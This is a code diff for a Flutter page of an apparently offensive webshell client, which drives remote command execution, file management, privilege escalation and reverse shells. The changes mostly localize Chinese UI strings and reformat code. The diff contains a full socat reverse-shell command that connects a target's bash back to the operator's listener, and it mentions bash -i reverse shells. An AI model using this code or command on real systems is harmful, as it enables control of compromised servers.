@@ -7,6 +7,7 @@ import '../services/reverse_shell_service.dart';
 import '../services/webshell_service.dart';
 import '../theme/app_theme.dart';
 import '../utils/matrix_console_log.dart';
+import '../app/localization.dart';
 import 'reverse_shell_terminal_page.dart';
 import 'webshell_interactive_file_manager.dart';
 import 'webshell_interactive_system_priv_esc.dart';
@@ -42,8 +43,6 @@ class _WebshellInteractivePageState extends State<WebshellInteractivePage>
     _checkConnection();
   }
 
-  static const _kPingFailHint =
-      '请核对：① 连接器类型与目标脚本是否一致；② 地址能否在浏览器打开。';
   static const _kPingFallbackTag = '__MATRIX_PING_FALLBACK_OK__';
 
   Future<void> _checkConnection() async {
@@ -94,7 +93,7 @@ class _WebshellInteractivePageState extends State<WebshellInteractivePage>
       setState(() {
         _isConnected = alive;
         _isChecking = false;
-        _lastPingError = alive ? null : _kPingFailHint;
+        _lastPingError = alive ? null : S.pingFailHint;
       });
     }
   }
@@ -125,18 +124,28 @@ class _WebshellInteractivePageState extends State<WebshellInteractivePage>
                 else if (!_isConnected)
                   Container(
                     width: double.infinity,
-                    padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
+                    padding: const EdgeInsets.symmetric(
+                      horizontal: 16,
+                      vertical: 8,
+                    ),
                     color: AppColors.red.withValues(alpha: 0.08),
                     child: Row(
                       children: [
-                        const Icon(Icons.warning_amber_rounded, color: AppColors.red, size: 15),
+                        const Icon(
+                          Icons.warning_amber_rounded,
+                          color: AppColors.red,
+                          size: 15,
+                        ),
                         const SizedBox(width: 8),
                         Expanded(
                           child: Text(
                             _lastPingError != null && _lastPingError!.isNotEmpty
                                 ? _lastPingError!
-                                : '连接失败，命令执行可能异常',
-                            style: AppTextStyles.caption(color: AppColors.red, size: 12),
+                                : S.connectionFailed,
+                            style: AppTextStyles.caption(
+                              color: AppColors.red,
+                              size: 12,
+                            ),
                             maxLines: 1,
                             overflow: TextOverflow.ellipsis,
                           ),
@@ -145,8 +154,11 @@ class _WebshellInteractivePageState extends State<WebshellInteractivePage>
                         GestureDetector(
                           onTap: _checkConnection,
                           child: Text(
-                            '重试',
-                            style: AppTextStyles.caption(color: AppColors.primary, size: 12),
+                            S.btnRetry,
+                            style: AppTextStyles.caption(
+                              color: AppColors.primary,
+                              size: 12,
+                            ),
                           ),
                         ),
                       ],
@@ -162,13 +174,17 @@ class _WebshellInteractivePageState extends State<WebshellInteractivePage>
                         children: [
                           FocusScope(
                             skipTraversal: _tabController.index != 0,
-                            child: _TerminalTab(service: _service, completer: _completer),
+                            child: _TerminalTab(
+                              service: _service,
+                              completer: _completer,
+                            ),
                           ),
                           FocusScope(
                             skipTraversal: _tabController.index != 1,
                             child: FileManagerTab(
                               service: _service,
-                              onInvalidateCompleterDir: _completer.invalidateDir,
+                              onInvalidateCompleterDir:
+                                  _completer.invalidateDir,
                             ),
                           ),
                           FocusScope(
@@ -211,7 +227,7 @@ class _WebshellInteractivePageState extends State<WebshellInteractivePage>
               color: AppColors.textSecondary,
               size: 17,
             ),
-            tooltip: '返回',
+            tooltip: S.tooltipBack,
           ),
           const SizedBox(width: 4),
           // Status dot
@@ -273,10 +289,10 @@ class _WebshellInteractivePageState extends State<WebshellInteractivePage>
             icon: const Icon(Icons.wifi_tethering_rounded, size: 15),
             label: Text(
               _isChecking
-                  ? '检测中'
+                  ? S.statusChecking
                   : _isConnected
-                  ? '已连接'
-                  : '重连',
+                  ? S.statusConnected
+                  : S.statusReconnect,
             ),
             style: TextButton.styleFrom(
               foregroundColor: _isConnected
@@ -327,11 +343,20 @@ class _WebshellInteractivePageState extends State<WebshellInteractivePage>
         labelColor: AppColors.primary,
         unselectedLabelColor: AppColors.textSecondary,
         labelStyle: AppTextStyles.body(size: 13),
-        tabs: const [
-          Tab(icon: Icon(Icons.terminal, size: 15), text: '终  端'),
-          Tab(icon: Icon(Icons.folder_open_outlined, size: 15), text: '文件管理'),
-          Tab(icon: Icon(Icons.dns_outlined, size: 15), text: '系统信息'),
-          Tab(icon: Icon(Icons.shield_outlined, size: 15), text: '提  权'),
+        tabs: [
+          Tab(icon: const Icon(Icons.terminal, size: 15), text: S.tabTerminal),
+          Tab(
+            icon: const Icon(Icons.folder_open_outlined, size: 15),
+            text: S.tabFileManager,
+          ),
+          Tab(
+            icon: const Icon(Icons.dns_outlined, size: 15),
+            text: S.tabSysInfo,
+          ),
+          Tab(
+            icon: const Icon(Icons.shield_outlined, size: 15),
+            text: S.sectionPrivEsc,
+          ),
         ],
       ),
     );
@@ -423,8 +448,7 @@ class _TerminalTabState extends State<_TerminalTab>
     // cd 命令追加 marker+pwd，单次请求同时获取新目录，不再额外发网络请求
     const cwdMarker = '__MATRIX_CWD__';
     final isCd = cmd == 'cd' || cmd.startsWith('cd ') || cmd.startsWith('cd\t');
-    final sendCmd =
-        isCd ? "$cmd 2>&1; echo '$cwdMarker'; pwd" : cmd;
+    final sendCmd = isCd ? "$cmd 2>&1; echo '$cwdMarker'; pwd" : cmd;
 
     final execResult = await widget.service.executeCommand(
       sendCmd,
@@ -451,7 +475,7 @@ class _TerminalTabState extends State<_TerminalTab>
 
     if (mounted) {
       setState(() {
-        entry.output = output.isEmpty ? '(无输出)' : output;
+        entry.output = output.isEmpty ? S.noOutput : output;
         _executing = false;
       });
       // 命令执行后使当前目录缓存失效，确保 touch/mkdir/rm 等操作能被 Tab 补全识别
@@ -540,14 +564,14 @@ class _TerminalTabState extends State<_TerminalTab>
               if (_entries.isNotEmpty)
                 _toolbarBtn(
                   icon: Icons.delete_sweep_outlined,
-                  tooltip: '清空终端',
+                  tooltip: S.tooltipClearTerminal,
                   onTap: () => setState(() => _entries.clear()),
                 ),
               const SizedBox(width: 6),
               // 完整终端（反弹 Shell）按钮
               _toolbarBtn(
                 icon: Icons.open_in_new,
-                tooltip: '完整终端（反弹 Shell）',
+                tooltip: S.tooltipFullTerminal,
                 onTap: _showReverseShellDialog,
               ),
               const SizedBox(width: 6),
@@ -584,7 +608,7 @@ class _TerminalTabState extends State<_TerminalTab>
         return StatefulBuilder(
           builder: (context, setState) {
             return AlertDialog(
-              title: const Text('选择完整终端方案'),
+              title: Text(S.titleSelectTerminalMode),
               content: Column(
                 mainAxisSize: MainAxisSize.min,
                 children: [
@@ -592,30 +616,30 @@ class _TerminalTabState extends State<_TerminalTab>
                     value: 'script',
                     groupValue: selected,
                     onChanged: (v) => setState(() => selected = v!),
-                    title: const Text('内置反弹 · script 模式'),
-                    subtitle: const Text(
-                      '优先使用 script 分配伪终端，推荐在类 Unix 目标上使用',
-                      style: TextStyle(fontSize: 11),
+                    title: Text(S.terminalModeScript),
+                    subtitle: Text(
+                      S.terminalModeScriptDesc,
+                      style: const TextStyle(fontSize: 11),
                     ),
                   ),
                   RadioListTile<String>(
                     value: 'bash',
                     groupValue: selected,
                     onChanged: (v) => setState(() => selected = v!),
-                    title: const Text('内置反弹 · bash 模式'),
-                    subtitle: const Text(
-                      '不依赖 script，仅使用 bash -i 或 /bin/sh -i 反弹',
-                      style: TextStyle(fontSize: 11),
+                    title: Text(S.terminalModeBash),
+                    subtitle: Text(
+                      S.terminalModeBashDesc,
+                      style: const TextStyle(fontSize: 11),
                     ),
                   ),
                   RadioListTile<String>(
                     value: 'socat',
                     groupValue: selected,
                     onChanged: (v) => setState(() => selected = v!),
-                    title: const Text('socat 反弹（在目标上手动执行命令）'),
-                    subtitle: const Text(
-                      '适合目标已安装 socat，获得更完整的 TTY 体验',
-                      style: TextStyle(fontSize: 11),
+                    title: Text(S.terminalModeSocat),
+                    subtitle: Text(
+                      S.terminalModeSocatDesc,
+                      style: const TextStyle(fontSize: 11),
                     ),
                   ),
                 ],
@@ -623,11 +647,11 @@ class _TerminalTabState extends State<_TerminalTab>
               actions: [
                 TextButton(
                   onPressed: () => Navigator.of(context).pop(null),
-                  child: const Text('取消'),
+                  child: Text(S.btnCancel),
                 ),
                 FilledButton(
                   onPressed: () => Navigator.of(context).pop(selected),
-                  child: const Text('确定'),
+                  child: Text(S.btnConfirm),
                 ),
               ],
             );
@@ -667,10 +691,10 @@ class _TerminalTabState extends State<_TerminalTab>
 
         if (!mounted) return;
         ScaffoldMessenger.of(context).showSnackBar(
-          const SnackBar(
+          SnackBar(
             content: Text(
-              '已发送反弹 Shell 命令，等待连接 ...',
-              style: TextStyle(color: Colors.white),
+              S.snackReverseShellSent,
+              style: const TextStyle(color: Colors.white),
             ),
             backgroundColor: Color(0xFF064D2E), // 暗绿色背景
             behavior: SnackBarBehavior.floating,
@@ -680,8 +704,10 @@ class _TerminalTabState extends State<_TerminalTab>
         if (!mounted) return;
         ScaffoldMessenger.of(context).showSnackBar(
           SnackBar(
-            content: Text('启动失败：$e',
-                style: const TextStyle(color: Colors.white)),
+            content: Text(
+              S.snackStartFailed(e),
+              style: const TextStyle(color: Colors.white),
+            ),
             backgroundColor: AppColors.red,
             behavior: SnackBarBehavior.floating,
           ),
@@ -708,8 +734,10 @@ class _TerminalTabState extends State<_TerminalTab>
         if (!mounted) return;
         ScaffoldMessenger.of(context).showSnackBar(
           SnackBar(
-            content: Text('启动监听失败：$e',
-                style: const TextStyle(color: Colors.white)),
+            content: Text(
+              S.snackListenFailed(e),
+              style: const TextStyle(color: Colors.white),
+            ),
             backgroundColor: AppColors.red,
             behavior: SnackBarBehavior.floating,
           ),
@@ -717,20 +745,21 @@ class _TerminalTabState extends State<_TerminalTab>
         return;
       }
 
-      final cmd = 'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:${rs.lhost}:${rs.lport}';
+      final cmd =
+          'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:${rs.lhost}:${rs.lport}';
 
       if (!mounted) return;
       await showDialog<void>(
         context: context,
         builder: (context) {
           return AlertDialog(
-            title: const Text('socat 反弹命令'),
+            title: Text(S.titleSocatCommand),
             content: Column(
               mainAxisSize: MainAxisSize.min,
               crossAxisAlignment: CrossAxisAlignment.start,
               children: [
                 Text(
-                  '在目标机器上执行以下命令以建立完整 TTY 反弹 Shell：',
+                  S.socatInstructions,
                   style: AppTextStyles.caption(
                     size: 12,
                     color: AppColors.textSecondary,
@@ -754,7 +783,7 @@ class _TerminalTabState extends State<_TerminalTab>
                 ),
                 const SizedBox(height: 8),
                 Text(
-                  '提示：\n1. 本机已在 :${rs.lport} 端口监听。\n2. 目标执行成功后，这里会自动弹出完整终端窗口。',
+                  S.socatTips(rs.lport),
                   style: AppTextStyles.caption(
                     size: 11,
                     color: AppColors.textMuted,
@@ -765,7 +794,7 @@ class _TerminalTabState extends State<_TerminalTab>
             actions: [
               TextButton(
                 onPressed: () => Navigator.of(context).pop(),
-                child: const Text('关闭'),
+                child: Text(S.btnClose),
               ),
             ],
           );
@@ -888,7 +917,7 @@ class _TerminalTabState extends State<_TerminalTab>
               const Icon(Icons.terminal, color: AppColors.primary, size: 48),
               const SizedBox(height: 16),
               Text(
-                '> 输入命令开始执行',
+                S.terminalEmptyHint,
                 style: AppTextStyles.terminal(
                   size: 14,
                   color: AppColors.textMuted,
@@ -896,7 +925,7 @@ class _TerminalTabState extends State<_TerminalTab>
               ),
               const SizedBox(height: 8),
               Text(
-                '使用 ↑↓ 键切换历史命令，输入 clear 清空终端',
+                S.terminalKeyHint,
                 style: AppTextStyles.caption(
                   size: 12,
                   color: AppColors.textMuted,
@@ -945,7 +974,7 @@ class _TerminalTabState extends State<_TerminalTab>
           ),
           const SizedBox(width: 10),
           Text(
-            '执行中...',
+            S.executing,
             style: AppTextStyles.terminal(size: 12, color: AppColors.textMuted),
           ),
         ],
@@ -1076,7 +1105,9 @@ class _TerminalTabState extends State<_TerminalTab>
             padding: const EdgeInsets.all(10),
             decoration: BoxDecoration(
               color: AppColors.bgElevated.withValues(alpha: 0.97),
-              border: Border.all(color: AppColors.primary.withValues(alpha: 0.4)),
+              border: Border.all(
+                color: AppColors.primary.withValues(alpha: 0.4),
+              ),
               borderRadius: BorderRadius.circular(8),
               boxShadow: [
                 BoxShadow(
@@ -1094,7 +1125,7 @@ class _TerminalTabState extends State<_TerminalTab>
                   children: [
                     Expanded(
                       child: Text(
-                        'Tab 候选（$total）',
+                        S.tabCompletionTitle(total),
                         style: AppTextStyles.caption(
                           size: 11,
                           color: AppColors.amber,
@@ -1118,7 +1149,7 @@ class _TerminalTabState extends State<_TerminalTab>
                 const SizedBox(height: 6),
                 if (total == 0)
                   Text(
-                    '当前无候选',
+                    S.noCompletions,
                     style: AppTextStyles.terminal(
                       size: 12,
                       color: AppColors.textSecondary,
@@ -1182,7 +1213,9 @@ class _TerminalTabState extends State<_TerminalTab>
     if (newText == null || !mounted) return;
     _tabbing = true;
     _inputController.text = newText;
-    _inputController.selection = TextSelection.collapsed(offset: newText.length);
+    _inputController.selection = TextSelection.collapsed(
+      offset: newText.length,
+    );
     _tabbing = false;
     _lastTabWasDouble = false;
     _inputFocus.requestFocus();
@@ -1223,4 +1256,3 @@ class _TerminalTabState extends State<_TerminalTab>
     super.dispose();
   }
 }
-
